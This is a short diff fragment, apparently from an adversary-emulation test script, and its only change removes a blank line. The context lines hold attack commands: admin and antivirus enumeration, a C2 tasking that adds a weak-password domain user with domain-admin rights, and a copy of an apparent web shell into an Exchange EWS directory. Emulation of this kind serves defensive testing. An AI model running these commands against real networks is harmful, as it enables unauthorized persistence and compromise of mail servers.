@@ -21,7 +21,6 @@ net localgroup administratorsImport-Module .\ps.ps1 -Verbose -Force;
 ProcessList
 . .\stepTwelve.ps1;
 detectav
-
 sc query
 ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
 copy C:\Users\Public\contact.aspx "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"
